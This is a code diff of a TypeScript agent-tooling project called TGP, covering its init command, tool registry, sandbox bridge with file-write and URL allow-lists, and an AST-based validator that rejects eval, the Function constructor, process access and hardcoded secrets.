+  const gitIgnorePath = path.join(cwd, '.gitignore');
+  const tgpDir = path.join(cwd, '.tgp');
+  const toolsDir = path.join(tgpDir, 'tools');
+  const binDir = path.join(tgpDir, 'bin');
+  const metaPath = path.join(tgpDir, 'meta.json');
+
+  // 1. Create tgp.config.ts
+  if (await exists(configPath)) {
+    console.log(`[TGP] tgp.config.ts already exists. Skipping.`);
+  } else {
+    await fs.writeFile(configPath, CONFIG_TEMPLATE.trim());
+    console.log(`[TGP] Created tgp.config.ts`);
+  }
+
+  // 2. Update .gitignore
+  if (await exists(gitIgnorePath)) {
+    const content = await fs.readFile(gitIgnorePath, 'utf-8');
+    if (!content.includes('.tgp')) {
+      await fs.appendFile(gitIgnorePath, '\n# TGP\n.tgp\n.tgp/meta.json\n');
+      console.log(`[TGP] Added .tgp to .gitignore`);
+    }
+  } else {
+    await fs.writeFile(gitIgnorePath, '# TGP\n.tgp\n.tgp/meta.json\n');
+    console.log(`[TGP] Created .gitignore`);
+  }
+
+  // 3. Create .tgp directory (just to be nice)
+  await fs.mkdir(tgpDir, { recursive: true });
+
+  // 4. Scaffold Tools directory
+  await fs.mkdir(toolsDir, { recursive: true });
+  await fs.mkdir(binDir, { recursive: true });
+  console.log(`[TGP] Created .tgp/tools and .tgp/bin directories`);
+
+  // 5. Initialize Registry (meta.json)
+  if (!await exists(metaPath)) {
+    await fs.writeFile(metaPath, JSON.stringify({ tools: {} }, null, 2));
+    console.log(`[TGP] Created .tgp/meta.json`);
+  }
+
+  console.log(`[TGP] Initialization complete. Run 'npx tgp' to start hacking.`);
+}
+
+async function exists(p: string) {
+  try {
+    await fs.access(p);
+    return true;
+  } catch {
+    return false;
+  }
+}
+
+const CONFIG_TEMPLATE = `
+import { defineTGPConfig } from '@tgp/core';
+
+export default defineTGPConfig({
+  // The Root of the Agent's filesystem (Ephemeral in serverless)
+  rootDir: './.tgp',
+
+  // 1. BACKEND (GitOps)
+  // Essential for Serverless/Ephemeral environments.
+  // The Agent pulls state from here and pushes new tools here.
+  git: {
+    provider: 'github', // or 'gitlab', 'bitbucket'
+    repo: 'my-org/tgp-tools',
+    branch: 'main',
+    auth: {
+      // Why not in config? Because we read from ENV for security.
+      token: process.env.TGP_GITHUB_TOKEN,
+      user: 'tgp-bot[bot]',
+      email: 'tgp-bot@users.noreply.github.com'
+    },
+    // Strategy: 'direct' (push) or 'pr' (pull request)
+    writeStrategy: process.env.NODE_ENV === 'production' ? 'pr' : 'direct'
+  },
+
+  // 2. FILESYSTEM JAIL
+  fs: {
+    allowedDirs: ['./public/exports', './tmp'],
+    blockUpwardTraversal: true
+  },
+
+  // 3. RUNTIME
+  allowedImports: ['@tgp/std', 'zod', 'date-fns'],
+
+  // 4. NETWORKING
+  // Whitelist of URL prefixes the sandbox fetch can access.
+  // e.g. allowedFetchUrls: ['https://api.stripe.com', 'https://api.github.com']
+  allowedFetchUrls: []
+});
+`;
+````
+
+## File: src/kernel/registry.ts
+````typescript
+/* eslint-disable no-console */
+import { VFSAdapter } from '../vfs/types.js';
+import { RegistryState, ToolMetadata } from '../types.js';
+import * as path from 'path';
+import * as ts from 'typescript';
+
+export interface Registry {
+  hydrate(): Promise<void>;
+  register(filePath: string, code: string): Promise<void>;
+  list(): ToolMetadata[];
+  rebuild(): Promise<void>;
+  sync(): Promise<void>;
+}
+
+export function createRegistry(vfs: VFSAdapter): Registry {
+  let state: RegistryState = { tools: {} };
+  const META_PATH = 'meta.json';
+
+  // Helper to parse JSDoc
+  function extractMetadata(filePath: string, code: string): ToolMetadata {
+    const name = path.basename(filePath, path.extname(filePath));
+    let description = "No description provided.";
+
+    try {
+      // Use TypeScript AST to safely locate comments (avoids matching inside strings/templates)
+      const sourceFile = ts.createSourceFile(
+        filePath,
+        code,
+        ts.ScriptTarget.ES2020,
+        true
+      );
+
+      const cleanJSDoc = (comment: string) => {
+        return comment
+          .replace(/^\/\*\*/, '')
+          .replace(/\*\/$/, '')
+          .split('\n')
+          .map(line => line.replace(/^\s*\*\s?/, '').trim())
+          .filter(line => !line.startsWith('@') && line.length > 0)
+          .join(' ');
+      };
+
+      const findComment = (pos: number) => {
+        const ranges = ts.getLeadingCommentRanges(code, pos);
+        if (ranges && ranges.length > 0) {
+          const range = ranges[ranges.length - 1]; // Closest to the node
+          if (range.kind === ts.SyntaxKind.MultiLineCommentTrivia) {
+            const text = code.substring(range.pos, range.end);
+            if (text.startsWith('/**')) return cleanJSDoc(text);
+          }
+        }
+        return null;
+      };
+
+      // 1. Try attached to first statement (e.g. export const...)
+      if (sourceFile.statements.length > 0) {
+        const extracted = findComment(sourceFile.statements[0].getFullStart());
+        if (extracted !== null) description = extracted;
+      }
+      
+      // 2. Fallback: Try top of file (detached)
+      if (description === "No description provided.") {
+        const extracted = findComment(0);
+        if (extracted !== null) description = extracted;
+      }
+
+    } catch (err) {
+      console.warn(`[TGP] Failed to parse AST for ${filePath}. Falling back to default.`, err);
+    }
+
+    return {
+      name,
+      description: description || "No description provided.",
+      path: filePath
+    };
+  }
+
+  return {
+    async hydrate() {
+      if (await vfs.exists(META_PATH)) {
+        try {
+          const content = await vfs.readFile(META_PATH);
+          state = content.trim().length > 0 ? JSON.parse(content) : { tools: {} };
+          return;
+        } catch (err) {
+          console.warn('[TGP] Failed to parse meta.json, rebuilding cache.', err);
+        }
+      }
+      await this.rebuild();
+    },
+
+    async register(filePath: string, code: string) {
+      // Ignore non-tool files (e.g. config or hidden files)
+      if (!filePath.startsWith('tools/') && !filePath.startsWith('tools\\')) return;
+
+      const metadata = extractMetadata(filePath, code);
+      state.tools[filePath] = metadata;
+      
+      // We sync immediately to ensure data integrity, prioritizing safety over raw IO performance
+      // during tool creation.
+      await this.sync();
+    },
+
+    async rebuild() {
+      state = { tools: {} };
+      // Scan for tools recursively
+      const files = await vfs.listFiles('tools', true);
+      for (const file of files) {
+        if (file.endsWith('.ts')) {
+          try {
+            const code = await vfs.readFile(file);
+            const metadata = extractMetadata(file, code);
+            state.tools[file] = metadata;
+          } catch (err) {
+            console.warn(`[TGP] Failed to index ${file}`, err);
+          }
+        }
+      }
+      await this.sync();
+    },
+
+    list() {
+      return Object.values(state.tools);
+    },
+
+    async sync() {
+      await vfs.writeFile(META_PATH, JSON.stringify(state, null, 2));
+    }
+  };
 }
 ````
 
@@ -2138,7 +2271,7 @@ describe('E2E Scenarios', () => {
 
     let check = await tools.check_tool.execute({ path: magicTool });
     expect(check.valid).toBe(false);
-    expect(check.errors.some(e => e.includes('Magic Number'))).toBe(true);
+    expect(check.errors.some((e: string) => e.includes('Magic Number'))).toBe(true);
 
     // Test 2: Hardcoded Secret
     const secretTool = 'tools/bad/secret.ts';
@@ -2154,7 +2287,7 @@ describe('E2E Scenarios', () => {
 
     check = await tools.check_tool.execute({ path: secretTool });
     expect(check.valid).toBe(false);
-    expect(check.errors.some(e => e.includes('Secret'))).toBe(true);
+    expect(check.errors.some((e: string) => e.includes('Secret'))).toBe(true);
 
     // Test 3: Valid Tool (Control)
     const validTool = 'tools/good/clean.ts';
@@ -2182,343 +2315,6 @@ describe('E2E Scenarios', () => {
     expect(metaExists).toBe(true);
   });
 });
-````
-
-## File: src/cli/init.ts
-````typescript
-/* eslint-disable no-console */
-import * as fs from 'fs/promises';
-import * as path from 'path';
-
-export async function initCommand() {
-  const cwd = process.cwd();
-  console.log(`[TGP] Initializing in ${cwd}...`);
-
-  const configPath = path.join(cwd, 'tgp.config.ts');
-  const gitIgnorePath = path.join(cwd, '.gitignore');
-  const tgpDir = path.join(cwd, '.tgp');
-  const toolsDir = path.join(tgpDir, 'tools');
-  const binDir = path.join(tgpDir, 'bin');
-  const metaPath = path.join(tgpDir, 'meta.json');
-
-  // 1. Create tgp.config.ts
-  if (await exists(configPath)) {
-    console.log(`[TGP] tgp.config.ts already exists. Skipping.`);
-  } else {
-    await fs.writeFile(configPath, CONFIG_TEMPLATE.trim());
-    console.log(`[TGP] Created tgp.config.ts`);
-  }
-
-  // 2. Update .gitignore
-  if (await exists(gitIgnorePath)) {
-    const content = await fs.readFile(gitIgnorePath, 'utf-8');
-    if (!content.includes('.tgp')) {
-      await fs.appendFile(gitIgnorePath, '\n# TGP\n.tgp\n.tgp/meta.json\n');
-      console.log(`[TGP] Added .tgp to .gitignore`);
-    }
-  } else {
-    await fs.writeFile(gitIgnorePath, '# TGP\n.tgp\n.tgp/meta.json\n');
-    console.log(`[TGP] Created .gitignore`);
-  }
-
-  // 3. Create .tgp directory (just to be nice)
-  await fs.mkdir(tgpDir, { recursive: true });
-
-  // 4. Scaffold Tools directory
-  await fs.mkdir(toolsDir, { recursive: true });
-  await fs.mkdir(binDir, { recursive: true });
-  console.log(`[TGP] Created .tgp/tools and .tgp/bin directories`);
-
-  // 5. Initialize Registry (meta.json)
-  if (!await exists(metaPath)) {
-    await fs.writeFile(metaPath, JSON.stringify({ tools: {} }, null, 2));
-    console.log(`[TGP] Created .tgp/meta.json`);
-  }
-
-  console.log(`[TGP] Initialization complete. Run 'npx tgp' to start hacking.`);
-}
-
-async function exists(p: string) {
-  try {
-    await fs.access(p);
-    return true;
-  } catch {
-    return false;
-  }
-}
-
-const CONFIG_TEMPLATE = `
-import { defineTGPConfig } from '@tgp/core';
-
-export default defineTGPConfig({
-  // The Root of the Agent's filesystem (Ephemeral in serverless)
-  rootDir: './.tgp',
-
-  // 1. BACKEND (GitOps)
-  // Essential for Serverless/Ephemeral environments.
-  // The Agent pulls state from here and pushes new tools here.
-  git: {
-    provider: 'github', // or 'gitlab', 'bitbucket'
-    repo: 'my-org/tgp-tools',
-    branch: 'main',
-    auth: {
-      // Why not in config? Because we read from ENV for security.
-      token: process.env.TGP_GITHUB_TOKEN,
-      user: 'tgp-bot[bot]',
-      email: 'tgp-bot@users.noreply.github.com'
-    },
-    // Strategy: 'direct' (push) or 'pr' (pull request)
-    writeStrategy: process.env.NODE_ENV === 'production' ? 'pr' : 'direct'
-  },
-
-  // 2. FILESYSTEM JAIL
-  fs: {
-    allowedDirs: ['./public/exports', './tmp'],
-    blockUpwardTraversal: true
-  },
-
-  // 3. RUNTIME
-  allowedImports: ['@tgp/std', 'zod', 'date-fns'],
-
-  // 4. NETWORKING
-  // Whitelist of URL prefixes the sandbox fetch can access.
-  // e.g. allowedFetchUrls: ['https://api.stripe.com', 'https://api.github.com']
-  allowedFetchUrls: []
-});
-`;
-````
-
-## File: src/kernel/registry.ts
-````typescript
-/* eslint-disable no-console */
-import { VFSAdapter } from '../vfs/types.js';
-import { RegistryState, ToolMetadata } from '../types.js';
-import * as path from 'path';
-import * as ts from 'typescript';
-
-export interface Registry {
-  hydrate(): Promise<void>;
-  register(filePath: string, code: string): Promise<void>;
-  list(): ToolMetadata[];
-  rebuild(): Promise<void>;
-  sync(): Promise<void>;
-}
-
-export function createRegistry(vfs: VFSAdapter): Registry {
-  let state: RegistryState = { tools: {} };
-  const META_PATH = 'meta.json';
-
-  // Helper to parse JSDoc
-  function extractMetadata(filePath: string, code: string): ToolMetadata {
-    const name = path.basename(filePath, path.extname(filePath));
-    let description = "No description provided.";
-
-    try {
-      // Use TypeScript AST to safely locate comments (avoids matching inside strings/templates)
-      const sourceFile = ts.createSourceFile(
-        filePath,
-        code,
-        ts.ScriptTarget.ES2020,
-        true
-      );
-
-      const cleanJSDoc = (comment: string) => {
-        return comment
-          .replace(/^\/\*\*/, '')
-          .replace(/\*\/$/, '')
-          .split('\n')
-          .map(line => line.replace(/^\s*\*\s?/, '').trim())
-          .filter(line => !line.startsWith('@') && line.length > 0)
-          .join(' ');
-      };
-
-      const findComment = (pos: number) => {
-        const ranges = ts.getLeadingCommentRanges(code, pos);
-        if (ranges && ranges.length > 0) {
-          const range = ranges[ranges.length - 1]; // Closest to the node
-          if (range.kind === ts.SyntaxKind.MultiLineCommentTrivia) {
-            const text = code.substring(range.pos, range.end);
-            if (text.startsWith('/**')) return cleanJSDoc(text);
-          }
-        }
-        return null;
-      };
-
-      // 1. Try attached to first statement (e.g. export const...)
-      if (sourceFile.statements.length > 0) {
-        const extracted = findComment(sourceFile.statements[0].getFullStart());
-        if (extracted !== null) description = extracted;
-      }
-      
-      // 2. Fallback: Try top of file (detached)
-      if (description === "No description provided.") {
-        const extracted = findComment(0);
-        if (extracted !== null) description = extracted;
-      }
-
-    } catch (err) {
-      console.warn(`[TGP] Failed to parse AST for ${filePath}. Falling back to default.`, err);
-    }
-
-    return {
-      name,
-      description: description || "No description provided.",
-      path: filePath
-    };
-  }
-
-  return {
-    async hydrate() {
-      if (await vfs.exists(META_PATH)) {
-        try {
-          const content = await vfs.readFile(META_PATH);
-          state = content.trim().length > 0 ? JSON.parse(content) : { tools: {} };
-          return;
-        } catch (err) {
-          console.warn('[TGP] Failed to parse meta.json, rebuilding cache.', err);
-        }
-      }
-      await this.rebuild();
-    },
-
-    async register(filePath: string, code: string) {
-      // Ignore non-tool files (e.g. config or hidden files)
-      if (!filePath.startsWith('tools/') && !filePath.startsWith('tools\\')) return;
-
-      const metadata = extractMetadata(filePath, code);
-      state.tools[filePath] = metadata;
-      
-      // We sync immediately to ensure data integrity, prioritizing safety over raw IO performance
-      // during tool creation.
-      await this.sync();
-    },
-
-    async rebuild() {
-      state = { tools: {} };
-      // Scan for tools recursively
-      const files = await vfs.listFiles('tools', true);
-      for (const file of files) {
-        if (file.endsWith('.ts')) {
-          try {
-            const code = await vfs.readFile(file);
-            const metadata = extractMetadata(file, code);
-            state.tools[file] = metadata;
-          } catch (err) {
-            console.warn(`[TGP] Failed to index ${file}`, err);
-          }
-        }
-      }
-      await this.sync();
-    },
-
-    list() {
-      return Object.values(state.tools);
-    },
-
-    async sync() {
-      await vfs.writeFile(META_PATH, JSON.stringify(state, null, 2));
-    }
-  };
-}
-````
-
-## File: src/sandbox/bridge.ts
-````typescript
-/* eslint-disable no-console */
-import { Kernel } from '../kernel/core.js';
-import * as path from 'path';
-import { TGPConfig } from '../types.js';
-
-export interface SandboxBridgeOptions {
-  kernel: {
-    vfs: Kernel['vfs'];
-    config: TGPConfig;
-    sandboxAPI: Kernel['sandboxAPI'];
-  };
-  onLog?: (message: string) => void;
-}
-
-/**
- * Creates the Bridge Object exposed to the Sandbox.
- * This maps secure Kernel methods to the Guest environment.
- * 
- * We expose a structured 'tgp' object to the guest.
- */
-export function createSandboxBridge({ kernel, onLog }: SandboxBridgeOptions) {
-  const { vfs, config } = kernel;
-  const { allowedDirs } = config.fs;
-  const { allowedFetchUrls } = config;
-
-  const isAllowedWrite = (target: string): boolean => {
-    // Normalize target to ensure clean comparison (remove leading ./, etc)
-    const normalizedTarget = path.normalize(target).replace(/^(\.\/)/, '');
-    
-    return allowedDirs.some(dir => {
-      const normalizedDir = path.normalize(dir).replace(/^(\.\/)/, '');
-      // Check if target is inside the allowed dir
-      return normalizedTarget.startsWith(normalizedDir);
-    });
-  };
-
-  return {
-    tgp: {
-      // --- Filesystem Bridge (Jailed) ---
-      read_file: async (path: string) => {
-        return vfs.readFile(path);
-      },
-
-      write_file: async (path: string, content: string) => {
-        if (!isAllowedWrite(path)) {
-          throw new Error(`Security Violation: Write access denied for '${path}'. Allowed directories: ${allowedDirs.join(', ')}`);
-        }
-        return vfs.writeFile(path, content);
-      },
-
-      list_files: async (dir: string) => {
-        return vfs.listFiles(dir, false);
-      },
-
-      // --- Network Bridge (Allowed Only) ---
-      // eslint-disable-next-line @typescript-eslint/no-explicit-any
-      fetch: async (url: string, init?: any) => {
-        // Security: Enforce URL allow-list
-        if (!allowedFetchUrls || allowedFetchUrls.length === 0) {
-          throw new Error(`Security Violation: Network access is disabled. No URLs are whitelisted in tgp.config.ts.`);
-        }
-        const isAllowed = allowedFetchUrls.some(prefix => url.startsWith(prefix));
-        if (!isAllowed) {
-          throw new Error(`Security Violation: URL "${url}" is not in the allowed list.`);
-        }
-
-        const response = await fetch(url, init);
-
-        // Return a serializable, safe subset of the Response object.
-        // The methods must be wrapped to be transferred correctly.
-        return {
-          status: response.status,
-          statusText: response.statusText,
-          headers: Object.fromEntries(response.headers.entries()),
-          text: () => response.text(),
-          json: () => response.json(),
-        };
-      },
-
-      // --- Logger ---
-      // eslint-disable-next-line @typescript-eslint/no-explicit-any
-      log: (...args: any[]) => {
-        const msg = args.map(a => typeof a === 'string' ? a : JSON.stringify(a)).join(' ');
-        if (onLog) {
-            onLog(msg);
-        } else {
-            console.log('[TGP-TOOL]', msg);
-        }
-      },
-
-      // --- Dynamic API Injection ---
-      ...kernel.sandboxAPI
-    }
-  };
-}
 ````
 
 ## File: src/sandbox/isolate.ts
@@ -2936,137 +2732,108 @@ export interface Logger {
 }
 ````
 
-## File: src/tools/validation.ts
+## File: src/sandbox/bridge.ts
 ````typescript
-import { z } from 'zod';
-import * as ts from 'typescript';
+/* eslint-disable no-console */
 import { Kernel } from '../kernel/core.js';
-import { AgentTool } from './types.js';
+import * as path from 'path';
+import { TGPConfig } from '../types.js';
 
-export const CheckToolParams = z.object({
-  path: z.string().describe('The relative path of the tool to validate'),
-});
+export interface SandboxBridgeOptions {
+  kernel: {
+    vfs: Kernel['vfs'];
+    config: TGPConfig;
+    sandboxAPI: Kernel['sandboxAPI'];
+  };
+  onLog?: (message: string) => void;
+}
 
-export function createValidationTools(kernel: Kernel) {
+/**
+ * Creates the Bridge Object exposed to the Sandbox.
+ * This maps secure Kernel methods to the Guest environment.
+ * 
+ * We expose a structured 'tgp' object to the guest.
+ */
+export function createSandboxBridge({ kernel, onLog }: SandboxBridgeOptions) {
+  const { vfs, config } = kernel;
+  const { allowedDirs } = config.fs;
+  const { allowedFetchUrls } = config;
+
+  const isAllowedWrite = (target: string): boolean => {
+    // Normalize target to ensure clean comparison (remove leading ./, etc)
+    const normalizedTarget = path.normalize(target).replace(/^(\.\/)/, '');
+
+    return allowedDirs.some(dir => {
+      const normalizedDir = path.normalize(dir).replace(/^(\.\/)/, '');
+      // Check if target is inside the allowed dir
+      return normalizedTarget.startsWith(normalizedDir);
+    });
+  };
+
+  // Build the tgp bridge object with explicit handling of sandboxAPI functions
+  const tgpBridge: Record<string, any> = {
+    // --- Filesystem Bridge (Jailed) ---
+    read_file: async (path: string) => {
+      return vfs.readFile(path);
+    },
+
+    write_file: async (path: string, content: string) => {
+      if (!isAllowedWrite(path)) {
+        throw new Error(`Security Violation: Write access denied for '${path}'. Allowed directories: ${allowedDirs.join(', ')}`);
+      }
+      return vfs.writeFile(path, content);
+    },
+
+    list_files: async (dir: string) => {
+      return vfs.listFiles(dir, false);
+    },
+
+    // --- Network Bridge (Allowed Only) ---
+    // eslint-disable-next-line @typescript-eslint/no-explicit-any
+    fetch: async (url: string, init?: any) => {
+      // Security: Enforce URL allow-list
+      if (!allowedFetchUrls || allowedFetchUrls.length === 0) {
+        throw new Error(`Security Violation: Network access is disabled. No URLs are whitelisted in tgp.config.ts.`);
+      }
+      const isAllowed = allowedFetchUrls.some(prefix => url.startsWith(prefix));
+      if (!isAllowed) {
+        throw new Error(`Security Violation: URL "${url}" is not in the allowed list.`);
+      }
+
+      const response = await fetch(url, init);
+
+      // Return a serializable, safe subset of the Response object.
+      // The methods must be wrapped to be transferred correctly.
+      return {
+        status: response.status,
+        statusText: response.statusText,
+        headers: Object.fromEntries(response.headers.entries()),
+        text: () => response.text(),
+        json: () => response.json(),
+      };
+    },
+
+    // --- Logger ---
+    // eslint-disable-next-line @typescript-eslint/no-explicit-any
+    log: (...args: any[]) => {
+      const msg = args.map(a => typeof a === 'string' ? a : JSON.stringify(a)).join(' ');
+      if (onLog) {
+          onLog(msg);
+      } else {
+          console.log('[TGP-TOOL]', msg);
+      }
+    },
+  };
+
+  // Explicitly add sandboxAPI functions to preserve their function nature
+  if (kernel.sandboxAPI) {
+    for (const [key, value] of Object.entries(kernel.sandboxAPI)) {
+      tgpBridge[key] = value;
+    }
+  }
+
   return {
-    check_tool: {
-      description: 'Run JIT compilation and AST-based static analysis on a tool.',
-      parameters: CheckToolParams,
-      execute: async ({ path }) => {
-        const { allowedImports } = kernel.config;
-        try {
-          const code = await kernel.vfs.readFile(path);
-          
-          // 1. Parse AST
-          // We use ES2020 as target to match the sandbox environment
-          const sourceFile = ts.createSourceFile(
-            path,
-            code,
-            ts.ScriptTarget.ES2020,
-            true
-          );
-
-          const errors: string[] = [];
-
-          // 2. Recursive AST Visitor
-          const visit = (node: ts.Node) => {
-            // [Standard 3] Strict Typing: No 'any'
-            if (node.kind === ts.SyntaxKind.AnyKeyword) {
-               errors.push("Violation [Standard 3]: Usage of 'any' is prohibited. Use specific types or generic constraints.");
-            }
-
-            // [Safety] Restricted Imports
-            if (ts.isImportDeclaration(node)) {
-                if (node.moduleSpecifier && ts.isStringLiteral(node.moduleSpecifier)) {
-                    const pkg = node.moduleSpecifier.text;
-                    if (!allowedImports.includes(pkg)) {
-                         errors.push(`Violation [Safety]: Restricted import of '${pkg}' detected.`);
-                    }
-                }
-            }
-
-            // [Safety] No 'eval'
-            if (ts.isCallExpression(node)) {
-                if (ts.isIdentifier(node.expression) && node.expression.text === 'eval') {
-                    errors.push("Violation [Safety]: Dynamic code execution ('eval') is prohibited.");
-                }
-            }
-
-            // [Safety] No 'new Function(...)'
-            if (ts.isNewExpression(node)) {
-                if (ts.isIdentifier(node.expression) && node.expression.text === 'Function') {
-                    errors.push("Violation [Safety]: Dynamic code execution ('Function' constructor) is prohibited.");
-                }
-            }
-
-            // [Standard 4] Stateless: No process global access (except process.env.NODE_ENV)
-            if (ts.isIdentifier(node) && node.text === 'process') {
-                // Check context to see if allowed.
-                // We allow strict access to `process.env.NODE_ENV`.
-                // AST Structure: PropertyAccess(NODE_ENV) -> PropertyAccess(env) -> Identifier(process)
-                
-                let isAllowed = false;
-                
-                // Ensure parent is property access 'env'
-                if (ts.isPropertyAccessExpression(node.parent) && node.parent.expression === node && node.parent.name.text === 'env') {
-                     // Ensure grandparent is property access 'NODE_ENV'
-                     if (ts.isPropertyAccessExpression(node.parent.parent) && node.parent.parent.expression === node.parent && node.parent.parent.name.text === 'NODE_ENV') {
-                         isAllowed = true;
-                     }
-                }
-                
-                if (!isAllowed) {
-                     // We check if this identifier is being used as a property access base or standalone.
-                     // To avoid noise, we only report if it's the base of a property access OR used standalone.
-                     // If it's a property of something else (e.g. myObj.process), parent is PropertyAccess but expression is NOT node.
-                     if (ts.isPropertyAccessExpression(node.parent) && node.parent.name === node) {
-                         // This is something.process - Allowed
-                     } else {
-                         errors.push("Violation [Standard 4]: Direct access to 'process' is prohibited. Use 'args' for inputs to ensure statelessness.");
-                     }
-                }
-            }
-
-            // [Standard 1] No Magic Numbers
-            if (node.kind === ts.SyntaxKind.NumericLiteral) {
-                const text = (node as ts.NumericLiteral).text;
-                const val = Number(text); // Handle hex, etc.
-                const allowed = [0, 1, 2, -1, 100, 1000];
-                if (!isNaN(val) && !allowed.includes(val)) {
-                    // Filter out array indices? Hard to detect without type checker.
-                    // We enforce strictness: abstract data to args.
-                    errors.push(`Violation [Standard 1]: Found potential Magic Number '${node.text}'. Abstract logic from data.`);
-                }
-            }
-
-            // [Standard 7] No Hardcoded Secrets
-            if (ts.isStringLiteral(node)) {
-                const text = node.text;
-                // Emails
-                if (/\b[\w.-]+@[\w.-]+\.\w{2,4}\b/.test(text)) {
-                     errors.push("Violation [Standard 7]: Hardcoded email address detected. Pass this as an argument.");
-                }
-                // Long Alphanumeric Strings (potential IDs/Keys) - strict heuristic
-                // Must be 24+ chars, alphanumeric mixed, no spaces.
-                if (/[a-zA-Z0-9-]{24,}/.test(text) && !text.includes(' ')) {
-                     errors.push("Violation [Standard 7]: Potential hardcoded ID or Secret detected. Pass this as an argument.");
-                }
-            }
-
-            ts.forEachChild(node, visit);
-          };
-
-          visit(sourceFile);
-
-          return { valid: errors.length === 0, errors };
-        // eslint-disable-next-line @typescript-eslint/no-explicit-any
-        } catch (error: any) {
-          const msg = error.message ?? String(error);
-          console.error('[Validation Error]', msg);
-          return { valid: false, errors: [msg] };
-        }
-      },
-    } as AgentTool<typeof CheckToolParams, { valid: boolean; errors: string[] }>,
+    tgp: tgpBridge
   };
 }
 ````
@@ -3429,6 +3196,141 @@ export function createKernel(opts: KernelOptions): Kernel {
 }
 ````
 
+## File: src/tools/validation.ts
+````typescript
+import { z } from 'zod';
+import * as ts from 'typescript';
+import { Kernel } from '../kernel/core.js';
+import { AgentTool } from './types.js';
+
+export const CheckToolParams = z.object({
+  path: z.string().describe('The relative path of the tool to validate'),
+});
+
+export function createValidationTools(kernel: Kernel) {
+  return {
+    check_tool: {
+      description: 'Run JIT compilation and AST-based static analysis on a tool.',
+      parameters: CheckToolParams,
+      execute: async ({ path }) => {
+        const { allowedImports } = kernel.config;
+        try {
+          const code = await kernel.vfs.readFile(path);
+          
+          // 1. Parse AST
+          // We use ES2020 as target to match the sandbox environment
+          const sourceFile = ts.createSourceFile(
+            path,
+            code,
+            ts.ScriptTarget.ES2020,
+            true
+          );
+
+          const errors: string[] = [];
+
+          // 2. Recursive AST Visitor
+          const visit = (node: ts.Node) => {
+            // [Standard 3] Strict Typing: No 'any'
+            if (node.kind === ts.SyntaxKind.AnyKeyword) {
+               errors.push("Violation [Standard 3]: Usage of 'any' is prohibited. Use specific types or generic constraints.");
+            }
+
+            // [Safety] Restricted Imports
+            if (ts.isImportDeclaration(node)) {
+                if (node.moduleSpecifier && ts.isStringLiteral(node.moduleSpecifier)) {
+                    const pkg = node.moduleSpecifier.text;
+                    if (!allowedImports.includes(pkg)) {
+                         errors.push(`Violation [Safety]: Restricted import of '${pkg}' detected.`);
+                    }
+                }
+            }
+
+            // [Safety] No 'eval'
+            if (ts.isCallExpression(node)) {
+                if (ts.isIdentifier(node.expression) && node.expression.text === 'eval') {
+                    errors.push("Violation [Safety]: Dynamic code execution ('eval') is prohibited.");
+                }
+            }
+
+            // [Safety] No 'new Function(...)'
+            if (ts.isNewExpression(node)) {
+                if (ts.isIdentifier(node.expression) && node.expression.text === 'Function') {
+                    errors.push("Violation [Safety]: Dynamic code execution ('Function' constructor) is prohibited.");
+                }
+            }
+
+            // [Standard 4] Stateless: No process global access (except process.env.NODE_ENV)
+            if (ts.isIdentifier(node) && node.text === 'process') {
+                // Check context to see if allowed.
+                // We allow strict access to `process.env.NODE_ENV`.
+                // AST Structure: PropertyAccess(NODE_ENV) -> PropertyAccess(env) -> Identifier(process)
+                
+                let isAllowed = false;
+                
+                // Ensure parent is property access 'env'
+                if (ts.isPropertyAccessExpression(node.parent) && node.parent.expression === node && node.parent.name.text === 'env') {
+                     // Ensure grandparent is property access 'NODE_ENV'
+                     if (ts.isPropertyAccessExpression(node.parent.parent) && node.parent.parent.expression === node.parent && node.parent.parent.name.text === 'NODE_ENV') {
+                         isAllowed = true;
+                     }
+                }
+                
+                if (!isAllowed) {
+                     // We check if this identifier is being used as a property access base or standalone.
+                     // To avoid noise, we only report if it's the base of a property access OR used standalone.
+                     // If it's a property of something else (e.g. myObj.process), parent is PropertyAccess but expression is NOT node.
+                     if (ts.isPropertyAccessExpression(node.parent) && node.parent.name === node) {
+                         // This is something.process - Allowed
+                     } else {
+                         errors.push("Violation [Standard 4]: Direct access to 'process' is prohibited. Use 'args' for inputs to ensure statelessness.");
+                     }
+                }
+            }
+
+            // [Standard 1] No Magic Numbers
+            if (node.kind === ts.SyntaxKind.NumericLiteral) {
+                const text = (node as ts.NumericLiteral).text;
+                const val = Number(text); // Handle hex, etc.
+                const allowed = [0, 1, 2, -1, 100, 1000];
+                if (!isNaN(val) && !allowed.includes(val)) {
+                    // Filter out array indices? Hard to detect without type checker.
+                    // We enforce strictness: abstract data to args.
+                    errors.push(`Violation [Standard 1]: Found potential Magic Number '${(node as ts.NumericLiteral).text}'. Abstract logic from data.`);
+                }
+            }
+
+            // [Standard 7] No Hardcoded Secrets
+            if (ts.isStringLiteral(node)) {
+                const text = node.text;
+                // Emails
+                if (/\b[\w.-]+@[\w.-]+\.\w{2,4}\b/.test(text)) {
+                     errors.push("Violation [Standard 7]: Hardcoded email address detected. Pass this as an argument.");
+                }
+                // Long Alphanumeric Strings (potential IDs/Keys) - strict heuristic
+                // Must be 24+ chars, alphanumeric mixed, no spaces.
+                if (/[a-zA-Z0-9-]{24,}/.test(text) && !text.includes(' ')) {
+                     errors.push("Violation [Standard 7]: Potential hardcoded ID or Secret detected. Pass this as an argument.");
+                }
+            }
+
+            ts.forEachChild(node, visit);
+          };
+
+          visit(sourceFile);
+
+          return { valid: errors.length === 0, errors };
+        // eslint-disable-next-line @typescript-eslint/no-explicit-any
+        } catch (error: any) {
+          const msg = error.message ?? String(error);
+          console.error('[Validation Error]', msg);
+          return { valid: false, errors: [msg] };
+        }
+      },
+    } as AgentTool<typeof CheckToolParams, { valid: boolean; errors: string[] }>,
+  };
+}
+````
+
 ## File: package.json
 ````json
 {
@@ -3444,7 +3346,7 @@ export function createKernel(opts: KernelOptions): Kernel {
     "lint": "eslint src/**/*.ts",
     "lint:fix": "eslint src/**/*.ts --fix",
     "pretest": "npm run build",
-    "test": "bun test",
+    "test": "bun test test/",
     "tgp": "node bin/tgp.js"
   },
   "keywords": [
@@ -3467,6 +3369,7 @@ export function createKernel(opts: KernelOptions): Kernel {
     "typescript": "^5.9.3"
   },
   "devDependencies": {
+    "ai": "5.0.104",
     "@types/node": "^20.19.25",
     "@types/better-sqlite3": "^7.6.9",
     "@typescript-eslint/eslint-plugin": "^8.48.0",
